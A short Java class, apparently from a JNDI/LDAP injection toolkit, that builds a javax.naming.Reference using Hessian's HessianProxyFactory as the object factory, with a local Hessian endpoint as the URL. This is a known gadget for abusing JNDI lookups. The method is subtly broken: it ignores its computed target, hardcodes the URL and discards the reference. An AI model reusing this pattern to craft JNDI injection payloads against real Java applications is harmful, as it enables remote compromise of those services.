package LDAP;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class ObjectFacRef {
    public static void getHessianProxyFactory(String url){
        String target = "";
        if (!url.isEmpty()){
            target = url;
        }else {
            target = "http://127.0.0.1:8076/hessian";
        }

        Reference ref = new Reference("test", "com.caucho.hessian.client.HessianProxyFactory", null);
        ref.add(new StringRefAddr("url", "http://127.0.0.1:8076/hessian"));
        ref.add(new StringRefAddr("type", "javax.naming.directory.DirContext"));
    }

}
